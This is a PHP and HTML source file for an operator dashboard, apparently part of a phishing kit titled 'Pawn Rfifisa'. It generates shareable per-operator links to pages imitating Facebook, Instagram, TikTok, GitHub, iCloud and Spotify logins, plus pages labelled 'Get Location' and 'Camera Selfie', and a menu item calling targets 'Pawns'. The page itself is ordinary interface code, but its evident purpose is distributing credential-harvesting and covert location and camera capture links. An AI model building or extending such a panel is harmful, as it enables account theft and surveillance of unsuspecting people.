<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: ../auth/login/');
    exit;
}

// Ensure user ID is available in session
$userId = isset($_SESSION['user']['id']) ? $_SESSION['user']['id'] : (isset($_SESSION['user_id']) ? $_SESSION['user_id'] : 'guest');
?>
<?php
// bord.php - Social Accounts Dashboard with Floating Action Menu
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Dashboard | Pawn Rfifisa </title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
            background: #02020A;
            overflow-x: hidden;
            min-height: 100vh;
        }

        .glass-card {
            background: rgba(12, 10, 22, 0.78);
            backdrop-filter: blur(18px);
            border: 1px solid rgba(139, 92, 246, 0.35);
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(139, 92, 246, 0.2) inset;
        }

        .service-card {
            background: rgba(12, 10, 22, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(139, 92, 246, 0.3);
            transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }
        .service-card:hover {
            transform: translateY(-4px);
            border-color: rgba(192, 132, 252, 0.6);
            box-shadow: 0 20px 35px -12px rgba(139, 92, 246, 0.3);
        }

        .btn-primary {
            background: linear-gradient(105deg, #8B5CF6, #C084FC);
            transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3);
        }
        .btn-primary:active { transform: scale(0.96); }
        
        .btn-secondary-copy {
            background: rgba(30, 27, 46, 0.8);
            border: 1px solid rgba(139, 92, 246, 0.5);
            transition: all 0.2s;
        }
        .btn-secondary-copy:active { transform: scale(0.96); }

        /* Blobs */
        .blob-1 {
            position: fixed;
            width: 70vw;
            height: 70vw;
            background: radial-gradient(circle, rgba(139, 92, 246, 0.3) 0%, rgba(76, 29, 149, 0) 70%);
            border-radius: 62% 38% 72% 28% / 46% 45% 55% 54%;
            filter: blur(80px);
            top: -20vh;
            left: -30vw;
            z-index: -2;
            animation: floatBlob 20s infinite alternate ease-in-out;
            pointer-events: none;
        }
        .blob-2 {
            position: fixed;
            width: 75vw;
            height: 75vw;
            background: radial-gradient(circle, rgba(192, 132, 252, 0.28) 0%, rgba(88, 28, 135, 0) 75%);
            bottom: -25vh;
            right: -30vw;
            filter: blur(90px);
            border-radius: 45% 55% 70% 30% / 55% 45% 55% 45%;
            animation: floatBlob2 24s infinite alternate;
            z-index: -2;
        }
        @keyframes floatBlob {
            0% { transform: translate(0, 0) rotate(0deg) scale(1); }
            100% { transform: translate(8%, 12%) rotate(6deg) scale(1.15); }
        }
        @keyframes floatBlob2 {
            0% { transform: translate(0, 0) rotate(0deg) scale(1); }
            100% { transform: translate(-10%, -10%) rotate(-5deg) scale(1.2); }
        }

        .toast-message {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(139,92,246,0.5);
            border-radius: 2rem;
            padding: 0.75rem 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            z-index: 1000;
            font-size: 0.875rem;
            font-weight: 500;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
            animation: toastFade 0.3s ease;
        }
        @keyframes toastFade {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        .url-text {
            font-size: 0.7rem;
            word-break: break-all;
            font-family: monospace;
            background: rgba(0,0,0,0.4);
            border-radius: 12px;
            padding: 0.25rem 0.5rem;
        }
        
        /* ========= FLOATING ACTION BUTTON + Y-AXIS ANIMATION (REDUCED SPACING) ========= */
        .fab-container {
            position: fixed;
            bottom: 28px;
            right: 28px;
            z-index: 999;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;  /* Reduced from 14px to 8px */
        }
        
        /* Action buttons that will animate on Y axis */
        .fab-action {
            width: 48px;
            height: 48px;
            border-radius: 24px;
            background: rgba(20, 18, 35, 0.95);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(139, 92, 246, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 6px 14px rgba(0,0,0,0.4);
            transform: translateY(0) scale(1);
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        
        .fab-action.active {
            opacity: 1;
            visibility: visible;
            pointer-events: auto;
        }
        
        /* Y-axis movement animations - REDUCED DISTANCE */
        .fab-action.move-up1 {
            transition: transform 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.2), opacity 0.2s, visibility 0s;
            transform: translateY(0);
        }
        .fab-action.move-up1.active {
            transform: translateY(-56px);  /* Reduced from 72px */
        }
        .fab-action.move-up2.active {
            transform: translateY(-112px); /* Reduced from 136px */
        }
        .fab-action.move-up3.active {
            transform: translateY(-168px); /* Reduced from 200px */
        }
        
        /* Main FAB button (+ icon) */
        .fab-main {
            width: 56px;
            height: 56px;
            border-radius: 28px;
            background: linear-gradient(135deg, #8B5CF6, #C084FC);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(139, 92, 246, 0.5);
            transition: all 0.2s;
            border: none;
            color: white;
            font-size: 26px;
        }
        .fab-main:active {
            transform: scale(0.92);
        }
        .fab-main i {
            transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }
        .fab-main.rotate-plus i {
            transform: rotate(45deg);
        }
        
        .fab-action:hover {
            background: rgba(139, 92, 246, 0.85);
            border-color: #C084FC;
            transform: scale(1.05) translateY(var(--shift, 0));
        }
        
        @media (max-width: 640px) {
            .service-card .flex.justify-between { flex-direction: column; gap: 0.5rem; }
            .service-card .flex.justify-between .btn-primary, 
            .service-card .flex.justify-between .btn-secondary-copy { width: 100%; justify-content: center; }
            .fab-container { bottom: 20px; right: 20px; gap: 6px; }
            .fab-main { width: 50px; height: 50px; font-size: 24px; }
            .fab-action { width: 42px; height: 42px; }
            .fab-action.move-up1.active { transform: translateY(-50px); }
            .fab-action.move-up2.active { transform: translateY(-98px); }
            .fab-action.move-up3.active { transform: translateY(-146px); }
        }
        
        /* Tooltip micro */
        .fab-action {
            position: relative;
        }
        .fab-action::after {
            content: attr(data-tooltip);
            position: absolute;
            right: 62px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
            color: #ddd;
            white-space: nowrap;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.2s;
            border: 1px solid rgba(139,92,246,0.5);
            font-family: 'Inter', monospace;
        }
        .fab-action:hover::after {
            opacity: 1;
        }
    </style>
</head>
<body>
<div class="blob-1"></div>
<div class="blob-2"></div>
<div class="fixed inset-0 bg-black/20 backdrop-blur-[2px] -z-10"></div>

<div class="max-w-7xl mx-auto px-4 py-6 sm:py-8 md:py-10">
    <div class="flex flex-col sm:flex-row justify-between items-center mb-8 gap-4">
        <div>
            <h1 class="text-3xl sm:text-4xl font-extrabold bg-gradient-to-r from-purple-300 to-fuchsia-400 bg-clip-text text-transparent">
                Service Accounts
            </h1>
            <p class="text-gray-400 text-sm mt-1">Manage your connected social accounts</p>
        </div>
        <div class="glass-card rounded-full px-5 py-2 flex items-center gap-2">
            <i class="bi bi-grid-3x3-gap-fill text-purple-300"></i>
            <span class="text-sm text-white/80 font-medium">9 active services</span>
        </div>
    </div>

    <!-- Services Grid -->
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
        <?php
        // Get current URL base (e.g., http://localhost:5173/board)
        function getCurrentBaseUrl() {
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
            $host = $_SERVER['HTTP_HOST'];
            $scriptDir = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
            // Remove trailing /board or /bord.php to get clean base
            $scriptDir = preg_replace('/(\/board|\/bord\.php)$/', '', $scriptDir);
            if ($scriptDir == '/') $scriptDir = '';
            return $protocol . "://" . $host . $scriptDir;
        }
        
        $baseUrl = getCurrentBaseUrl();
        // Use session user ID for the ?id parameter
        $userId = isset($_SESSION['user']['id']) ? $_SESSION['user']['id'] : (isset($_SESSION['user_id']) ? $_SESSION['user_id'] : 'guest');
        
        $services = [
            ['name' => 'Facebook', 'icon' => 'bi-facebook', 'bg_icon' => 'bg-blue-800/40', 'folder' => 'facebook', 'desc' => 'Manage pages & profile'],
            ['name' => 'OLD Facebook', 'icon' => 'bi-facebook', 'bg_icon' => 'bg-blue-900/40', 'folder' => 'old_facebook', 'desc' => 'Manage pages & profile'],
            ['name' => 'Instagram', 'icon' => 'bi-instagram', 'bg_icon' => 'bg-pink-900/40', 'folder' => 'instagram', 'desc' => 'Stories & analytics'],
            ['name' => 'TikTok', 'icon' => 'bi-tiktok', 'bg_icon' => 'bg-gray-800/60', 'folder' => 'tiktok', 'desc' => 'Video insights'],
            // ['name' => 'Twitter (X)', 'icon' => 'bi-twitter-x', 'bg_icon' => 'bg-slate-800/50', 'folder' => 'twitter', 'desc' => 'Realtime feed'],
            ['name' => 'Github', 'icon' => 'bi-github', 'bg_icon' => 'bg-zinc-900/40', 'folder' => 'github', 'desc' => 'Professional github'],
            ['name' => 'iCloud', 'icon' => 'bi-apple', 'bg_icon' => 'bg-gray-100/40', 'folder' => 'icloud', 'desc' => 'Appel Account'],
            ['name' => 'Spotify', 'icon' => 'bi-spotify', 'bg_icon' => 'bg-green-700/40', 'folder' => 'spotify', 'desc' => 'Spotify Music'],
            ['name' => 'Location', 'icon' => 'bi-geo-alt-fill', 'bg_icon' => 'bg-red-800/40', 'folder' => 'wifi', 'desc' => 'Get Lcation'],
            ['name' => 'Camera', 'icon' => 'bi-camera-fill', 'bg_icon' => 'bg-yellow-800/40', 'folder' => 'photomath', 'desc' => 'Camera Selfie'],
            ['name' => 'Camera omegle', 'icon' => 'bi-camera-video-fill', 'bg_icon' => 'bg-orange-800/40', 'folder' => 'omegle', 'desc' => 'Camera Selfie'],
            // ['name' => 'Telegram', 'icon' => 'bi-telegram', 'bg_icon' => 'bg-sky-900/40', 'folder' => 'telegram-acc', 'desc' => 'Channel & bot']
        ];
        
        foreach ($services as $service):
            // Build URL: baseUrl + /service-acc/folder...?id=$_SESSION['user']['id']
            $fullUrl = rtrim($baseUrl, '/') . '/service-account/' . $service['folder'] . '/?service-token=' . $userId;
        ?>
        <div class="service-card rounded-2xl p-5 transition-all duration-200 flex flex-col">
            <div class="flex items-center gap-3 mb-4">
                <div class="w-12 h-12 rounded-xl bg-gradient-to-br <?= $service['bg_icon'] ?> flex items-center justify-center border border-white/10 shadow-md">
                    <i class="<?= $service['icon'] ?> text-2xl text-white drop-shadow-sm"></i>
                </div>
                <div>
                    <h3 class="text-xl font-bold text-white"><?= htmlspecialchars($service['name']) ?></h3>
                    <p class="text-gray-400 text-xs"><?= htmlspecialchars($service['desc']) ?></p>
                </div>
            </div>
            <div class="mt-2 mb-4">
                <div class="url-text text-purple-200/80 mb-2 truncate" title="<?= htmlspecialchars($fullUrl) ?>">
                    <i class="bi bi-link-45deg text-purple-400 mr-1 text-xs"></i>
                    <span id="url_<?= md5($service['folder']) ?>_display"><?= htmlspecialchars($fullUrl) ?></span>
                </div>
            </div>
            <div class="flex justify-between items-center gap-3 mt-auto pt-2 flex-wrap">
                <button onclick="copyToClipboard('<?= addslashes($fullUrl) ?>', '<?= htmlspecialchars($service['name']) ?>')" 
                        class="btn-secondary-copy flex-1 py-2.5 rounded-xl text-white/90 font-medium text-sm flex items-center justify-center gap-2 transition-all">
                    <i class="bi bi-clipboard-check"></i> Copy
                </button>
                <a href="<?= htmlspecialchars($fullUrl) ?>" target="_blank" rel="noopener noreferrer" 
                   class="btn-primary flex-1 py-2.5 rounded-xl text-white font-semibold text-sm flex items-center justify-center gap-2 transition-all no-underline">
                    <i class="bi bi-box-arrow-up-right"></i> Visit
                </a>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
    
    <div class="text-center text-gray-500 text-xs mt-12 opacity-60">
        <i class="bi bi-shield-check"></i> Secure links · Dynamic routing with your account ID
    </div>
</div>

<!-- ================= FLOATING ACTION BUTTON (Y-AXIS ANIMATION - TIGHT SPACING) ================= -->
<div class="fab-container">
    <!-- Action 3: Developer (</> icon) - farthest top -->
    <div class="fab-action move-up3" data-tooltip="Developer Console" id="fabDev">
        <i class="bi bi-code-slash text-xl text-white"></i>
    </div>
    <!-- Action 2: Notebook -->
    <div class="fab-action move-up2" data-tooltip="Pawns" id="fabNotebook">
        <i class="bi bi-person-vcard text-xl text-white"></i>
    </div>
    <!-- Action 1: Profile -->
    <div class="fab-action move-up1" data-tooltip="Profile" id="fabProfile">
        <i class="bi bi-person-circle text-xl text-white"></i>
    </div>
    <!-- Main Plus Button -->
    <div class="fab-main" id="fabMain">
        <i class="bi bi-plus-lg text-2xl"></i>
    </div>
</div>

<script>
    // Toast & copy function
    function showToast(message, type = "info") {
        const existingToast = document.querySelector('.toast-message');
        if (existingToast) existingToast.remove();
        const toast = document.createElement('div');
        toast.className = 'toast-message';
        let icon = '<i class="bi bi-info-circle-fill text-purple-400"></i>';
        if (type === "success") icon = '<i class="bi bi-check-circle-fill text-green-400"></i>';
        if (type === "error") icon = '<i class="bi bi-exclamation-triangle-fill text-red-400"></i>';
        toast.innerHTML = `${icon}<span class="text-white">${message}</span>`;
        document.body.appendChild(toast);
        setTimeout(() => { if (toast.remove) toast.remove(); }, 2800);
    }

    async function copyToClipboard(url, serviceName) {
        try {
            await navigator.clipboard.writeText(url);
            showToast(`${serviceName} link copied`, "success");
        } catch (err) {
            const textarea = document.createElement('textarea');
            textarea.value = url;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showToast(`${serviceName} URL copied`, "success");
        }
    }
    
    // ----- FAB Y-AXIS ANIMATION LOGIC -----
    const fabMain = document.getElementById('fabMain');
    const fabProfile = document.getElementById('fabProfile');
    const fabNotebook = document.getElementById('fabNotebook');
    const fabDev = document.getElementById('fabDev');
    
    let isFabOpen = false;
    
    function openFabMenu() {
        fabProfile.classList.add('active');
        fabNotebook.classList.add('active');
        fabDev.classList.add('active');
        fabMain.classList.add('rotate-plus');
        isFabOpen = true;
    }
    
    function closeFabMenu() {
        fabProfile.classList.remove('active');
        fabNotebook.classList.remove('active');
        fabDev.classList.remove('active');
        fabMain.classList.remove('rotate-plus');
        isFabOpen = false;
    }
    
    function toggleFabMenu(e) {
        e.stopPropagation();
        if (isFabOpen) {
            closeFabMenu();
        } else {
            openFabMenu();
        }
    }
    
    // Attach main button click
    fabMain.addEventListener('click', toggleFabMenu);
    
    // Action buttons: do something + auto close after action
    function handleAction(actionName, callback) {
        closeFabMenu();
        if (callback) callback();
        else {
            showToast(`${actionName} section coming soon`, "info");
        }
    }
    
    fabProfile.addEventListener('click', (e) => {
        e.stopPropagation();
        handleAction("Profile", () => {
            window.location.href = "../profile";
        });
    });
    
    fabNotebook.addEventListener('click', (e) => {
        e.stopPropagation();
        handleAction("Notebook", () => {
            window.location.href = "../rook";
        });
    });
    
    fabDev.addEventListener('click', (e) => {
        e.stopPropagation();
        handleAction("Developer", () => {
            window.location.href = "../code";
        });
    });
    
    // Close FAB when clicking outside
    document.addEventListener('click', function(event) {
        const fabContainer = document.querySelector('.fab-container');
        if (isFabOpen && fabContainer && !fabContainer.contains(event.target)) {
            closeFabMenu();
        }
    });
    
    console.log("Floating action menu ready — Y-axis animation with tight spacing (8px gap)");
</script>
</body>
</html>